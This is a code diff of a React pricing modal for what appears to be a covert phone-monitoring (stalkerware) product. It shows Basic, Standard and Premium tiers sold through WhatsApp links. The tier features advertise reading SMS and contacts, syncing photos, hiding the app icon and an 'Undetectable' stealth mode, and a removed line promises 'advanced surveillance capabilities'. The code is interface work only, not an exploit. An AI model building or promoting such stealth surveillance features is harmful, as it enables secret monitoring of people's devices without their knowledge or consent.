@@ -1,5 +1,7 @@
 "use client";
 
+import { useState } from "react";
+
 interface PlansModalProps {
     isOpen: boolean;
     onClose: () => void;
@@ -16,171 +18,176 @@ export default function PlansModal({ isOpen, onClose, currentPlan, userEmail, us
         return `https://wa.me/923177407478?text=${encodeURIComponent(message)}`;
     };
 
+    const getNextPlan = () => {
+        if (currentPlan === 'basic') return 'standard';
+        if (currentPlan === 'standard') return 'premium';
+        return null;
+    };
+
     const plans = [
         {
             id: 'basic',
             name: 'Basic',
             price: 'Free',
-            icon: '🆓',
-            gradient: 'from-gray-700 to-gray-900',
-            border: 'border-white/10',
+            icon: '🌱',
+            color: 'from-gray-700 to-gray-800',
             features: [
-                '10, 20, 50 Items Sync',
-                'Basic Gallery Access',
-                'No ZIP Download',
-                'Limited Features'
-            ],
-            current: currentPlan === 'basic'
+                '50 Photos Sync',
+                'Basic Gallery',
+                'Limited Permissions'
+            ]
         },
         {
             id: 'standard',
             name: 'Standard',
             price: '$5',
-            icon: '⭐',
-            gradient: 'from-blue-600/20 to-purple-600/20',
-            border: 'border-blue-500/30',
-            glow: 'shadow-blue-500/10',
+            icon: '⚡',
+            color: 'from-blue-600 to-indigo-600',
             features: [
-                '50, 100, 200 Items Sync',
+                '200 Photos Sync',
                 'SMS & Contacts Access',
-                'Flashlight & Vibration',
-                'App Hiding Feature',
-                'Priority Fast Sync'
-            ],
-            current: currentPlan === 'standard'
+                'Hide App Icon',
+                'Flashlight & Vibration'
+            ]
         },
         {
             id: 'premium',
             name: 'Premium',
             price: '$10',
             icon: '👑',
-            gradient: 'from-yellow-500/20 to-orange-600/20',
-            border: 'border-yellow-500/50',
-            glow: 'shadow-yellow-500/20',
+            color: 'from-yellow-500 to-orange-600',
             features: [
-                'ALL Items Sync (Unlimited)',
-                'ZIP Download (One Click)',
-                'Cloud Backup Features',
-                'Stealth Mode++',
-                'All Standard Features',
-                '24/7 Priority Support'
+                'Unlimited All & ZIP Download',
+                'Cloud Backup & Priority Support',
+                'Stealth Mode++ (Undetectable)',
+                'All Features Unlocked'
             ],
-            popular: true,
-            current: currentPlan === 'premium'
+            popular: true
         }
     ];
 
     return (
-        <div className="fixed inset-0 z-[70] flex items-center justify-center bg-black/90 backdrop-blur-xl animate-fadeIn p-4">
-            <div className="relative w-full max-w-6xl max-h-[95vh] overflow-y-auto bg-[#050505] border border-white/10 rounded-[32px] shadow-2xl animate-scaleUp scrollbar-hide">
+        <div className="fixed inset-0 z-[80] flex items-end md:items-center justify-center bg-black/90 backdrop-blur-xl animate-fadeIn sm:p-4">
+            {/* Mobile Bottom Sheet / Desktop Modal */}
+            <div className="relative w-full md:max-w-4xl h-[90vh] md:h-auto md:max-h-[90vh] bg-[#0f0f0f] border-t md:border border-white/10 rounded-t-[2rem] md:rounded-[2rem] shadow-2xl flex flex-col overflow-hidden animate-slideUp">
 
-                {/* Background Blobs */}
-                <div className="absolute top-0 left-0 w-96 h-96 bg-purple-500/10 blur-[100px] rounded-full pointer-events-none" />
-                <div className="absolute bottom-0 right-0 w-96 h-96 bg-blue-500/10 blur-[100px] rounded-full pointer-events-none" />
-
-                {/* Close Button */}
-                <button
-                    onClick={onClose}
-                    className="absolute top-6 right-6 p-3 bg-white/5 rounded-full hover:bg-white/10 transition-colors z-20 group"
-                >
-                    <svg className="w-6 h-6 text-white/60 group-hover:text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                </button>
-
-                <div className="p-8 md:p-12 text-center relative z-10">
-                    <div className="inline-block px-4 py-1.5 rounded-full bg-gradient-to-r from-purple-500/20 to-blue-500/20 border border-purple-500/30 text-purple-300 text-sm font-semibold mb-6">
-                        ✨ UPGRADE YOUR EXPERIENCE
+                {/* Header */}
+                <div className="p-6 md:p-8 flex items-center justify-between border-b border-white/5 sticky top-0 bg-[#0f0f0f]/95 backdrop-blur z-20">
+                    <div>
+                        <h2 className="text-2xl font-bold text-white">Manage Plan</h2>
+                        <p className="text-sm text-white/50">Current Status: <span className="text-white font-medium capitalize">{currentPlan}</span></p>
                     </div>
+                    <button onClick={onClose} className="p-2 bg-white/5 rounded-full hover:bg-white/10 transition-colors">
+                        <svg className="w-6 h-6 text-white/60" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    </button>
+                </div>
 
-                    <h2 className="text-4xl md:text-5xl font-bold mb-6 bg-clip-text text-transparent bg-gradient-to-br from-white via-white to-white/40">
-                        Choose Your Power
-                    </h2>
-                    <p className="text-white/50 mb-16 max-w-2xl mx-auto text-lg leading-relaxed">
-                        Unlock advanced surveillance capabilities, unlimited downloads, and premium stealth features.
-                    </p>
+                {/* Content */}
+                <div className="flex-1 overflow-y-auto p-4 md:p-8 space-y-6 md:space-y-0 md:grid md:grid-cols-3 md:gap-6">
 
-                    <div className="grid md:grid-cols-3 gap-8">
-                        {plans.map((plan) => (
+                    {plans.map((plan) => {
+                        const isActive = currentPlan === plan.id;
+                        const isUpgrade = !isActive && (
+                            (currentPlan === 'basic' && (plan.id === 'standard' || plan.id === 'premium')) ||
+                            (currentPlan === 'standard' && plan.id === 'premium')
+                        );
+
+                        // Mobile: If basic, show basic (small) and upgrades (big).
+                        // If standard, show standard (small/active) and premium (big).
+
+                        return (
                             <div
                                 key={plan.id}
-                                className={`relative rounded-3xl p-1 flex flex-col transition-all duration-500 hover:-translate-y-2 ${plan.popular ? 'shadow-2xl shadow-yellow-500/10' : ''}`}
+                                className={`relative group rounded-3xl p-1 transition-all duration-300 ${isActive
+                                        ? 'order-1 md:order-none'
+                                        : isUpgrade
+                                            ? 'order-2 md:order-none scale-100'
+                                            : 'order-3 md:order-none opacity-50 contrast-75 grayscale'
+                                    }`}
                             >
-                                {/* Active Plan Indicator - Replaces the whole card border/glow if desired, but here we integrate it nicely */}
-                                {plan.current && (
-                                    <div className="absolute -top-4 left-1/2 -translate-x-1/2 bg-green-500 text-black font-bold px-4 py-1 rounded-full text-sm z-30 shadow-lg shadow-green-500/20 flex items-center gap-2">
-                                        <div className="w-2 h-2 bg-black rounded-full animate-pulse" />
-                                        ACTIVE PLAN
+                                {/* Active Badge */}
+                                {isActive && (
+                                    <div className="absolute -top-3 left-1/2 -translate-x-1/2 z-10 bg-black/80 border border-green-500/50 text-green-400 text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1.5 shadow-lg shadow-green-900/20">
+                                        <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
+                                        CURRENTLY ACTIVE
                                     </div>
                                 )}
 
-                                {/* Card Border Gradient */}
-                                <div className={`absolute inset-0 rounded-3xl bg-gradient-to-b ${plan.id === 'premium' ? 'from-yellow-500/50 to-orange-600/10' : plan.id === 'standard' ? 'from-blue-500/50 to-purple-600/10' : 'from-white/10 to-transparent'} pointer-events-none`} />
+                                {/* Popular/Upgrade Badge for Premium */}
+                                {plan.popular && !isActive && (
+                                    <div className="absolute -top-3 right-4 z-10 bg-gradient-to-r from-yellow-500 to-orange-500 text-black text-xs font-bold px-3 py-1 rounded-full shadow-lg shadow-orange-500/20">
+                                        REST RECOMMENDED
+                                    </div>
+                                )}
 
-                                <div className="relative h-full bg-[#0a0a0a] rounded-[28px] p-6 md:p-8 flex flex-col items-center overflow-hidden">
-                                    {/* Card Gradient Bg */}
-                                    <div className={`absolute inset-0 bg-gradient-to-br ${plan.gradient} opacity-10`} />
+                                {/* Card Border */}
+                                <div className={`absolute inset-0 rounded-3xl bg-gradient-to-b ${isActive ? 'from-green-500/50 to-green-900/10' :
+                                        plan.id === 'premium' ? 'from-yellow-500 to-orange-600' :
+                                            plan.id === 'standard' ? 'from-blue-500 to-indigo-600' :
+                                                'from-white/10 to-transparent'
+                                    } opacity-${isActive ? '100' : '40 group-hover:opacity-100'} transition-opacity`} />
 
-                                    {plan.popular && (
-                                        <div className="absolute top-6 right-6 text-yellow-400">
-                                            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
+                                {/* Card Content */}
+                                <div className="relative h-full bg-[#131313] rounded-[1.4rem] p-5 flex flex-col">
+
+                                    {/* Icon & Name */}
+                                    <div className="flex items-start justify-between mb-4">
+                                        <div>
+                                            <div className="text-3xl mb-2">{plan.icon}</div>
+                                            <h3 className="text-xl font-bold text-white">{plan.name}</h3>
                                         </div>
-                                    )}
-
-                                    <div className="w-20 h-20 rounded-2xl bg-white/5 flex items-center justify-center text-4xl mb-6 shadow-inner ring-1 ring-white/10">
-                                        {plan.icon}
+                                        <div className="text-right">
+                                            <div className="text-xl font-bold text-white">{plan.price}</div>
+                                            <div className="text-[10px] text-white/40 uppercase tracking-wider">Lifetime</div>
+                                        </div>
                                     </div>
 
-                                    <h3 className="text-2xl font-bold mb-2">{plan.name}</h3>
-                                    <div className="flex items-baseline gap-1 mb-8">
-                                        <span className="text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60">{plan.price}</span>
-                                        <span className="text-sm text-white/40">/lifetime</span>
-                                    </div>
-
-                                    <div className="w-full space-y-4 mb-8 flex-1">
+                                    {/* Features */}
+                                    <ul className="space-y-3 mb-6 flex-1">
                                         {plan.features.map((feature, i) => (
-                                            <div key={i} className="flex items-center gap-3 text-sm text-white/80">
-                                                <div className={`w-5 h-5 rounded-full flex items-center justify-center flex-shrink-0 ${plan.current ? 'bg-green-500/20 text-green-400' :
-                                                        plan.id === 'premium' ? 'bg-yellow-500/20 text-yellow-400' :
-                                                            plan.id === 'standard' ? 'bg-blue-500/20 text-blue-400' : 'bg-white/10 text-white/40'
-                                                    }`}>
-                                                    <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path></svg>
-                                                </div>
-                                                {feature}
-                                            </div>
+                                            <li key={i} className="flex items-start gap-2.5 text-sm text-white/70">
+                                                <svg className={`w-4 h-4 mt-0.5 flex-shrink-0 ${isActive ? 'text-green-500' :
+                                                        plan.id === 'premium' ? 'text-yellow-500' :
+                                                            plan.id === 'standard' ? 'text-blue-500' : 'text-white/30'
+                                                    }`} viewBox="0 0 20 20" fill="currentColor">
+                                                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                                                </svg>
+                                                <span className={feature.includes('Unlimited') || feature.includes('ZIP') ? 'text-white font-medium' : ''}>{feature}</span>
+                                            </li>
                                         ))}
-                                    </div>
+                                    </ul>
 
-                                    <div className="w-full mt-auto">
-                                        {plan.current ? (
-                                            <div className="w-full py-4 rounded-xl bg-green-500/10 border border-green-500/20 text-green-400 font-bold flex items-center justify-center gap-2">
-                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                                                Active Plan
+                                    {/* Action Button */}
+                                    <div className="mt-auto">
+                                        {isActive ? (
+                                            <div className="w-full py-3 rounded-xl bg-green-500/10 border border-green-500/20 text-green-500 text-sm font-bold flex items-center justify-center gap-2">
+                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path></svg>
+                                                Plan Active
                                             </div>
-                                        ) : plan.id === 'basic' ? (
-                                            <div className="w-full py-4 rounded-xl bg-white/5 text-white/30 font-semibold border border-white/5 flex items-center justify-center">
-                                                Included Free
-                                            </div>
-                                        ) : (
+                                        ) : isUpgrade ? (
                                             <a
                                                 href={generateWhatsAppLink(plan.name, plan.price)}
                                                 target="_blank"
                                                 rel="noopener noreferrer"
-                                                className={`group relative w-full overflow-hidden rounded-xl py-4 font-bold transition-all hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center ${plan.id === 'premium'
-                                                        ? 'bg-gradient-to-r from-yellow-500 to-orange-600 text-black shadow-lg shadow-orange-500/20'
-                                                        : 'bg-gradient-to-r from-blue-600 to-purple-600 text-white shadow-lg shadow-purple-500/20'
+                                                className={`w-full py-3.5 rounded-xl font-bold text-sm shadow-lg transform transition-all active:scale-95 flex items-center justify-center gap-2 ${plan.id === 'premium'
+                                                        ? 'bg-gradient-to-r from-yellow-500 to-orange-600 text-black shadow-orange-900/20'
+                                                        : 'bg-gradient-to-r from-blue-600 to-indigo-600 text-white shadow-blue-900/20'
                                                     }`}
                                             >
-                                                <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300 pointer-events-none" />
-                                                <span className="relative flex items-center gap-2">
-                                                    Upgrade Now
-                                                    <svg className="w-4 h-4 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 8l4 4m0 0l-4 4m4-4H3"></path></svg>
-                                                </span>
+                                                Upgrade to {plan.name}
+                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 7l5 5m0 0l-5 5m5-5H6"></path></svg>
                                             </a>
+                                        ) : (
+                                            <button disabled className="w-full py-3 rounded-xl bg-white/5 text-white/20 text-sm font-semibold cursor-not-allowed">
+                                                Included
+                                            </button>
                                         )}
                                     </div>
+
                                 </div>
                             </div>
-                        ))}
-                    </div>
+                        );
+                    })}
                 </div>
             </div>
         </div>
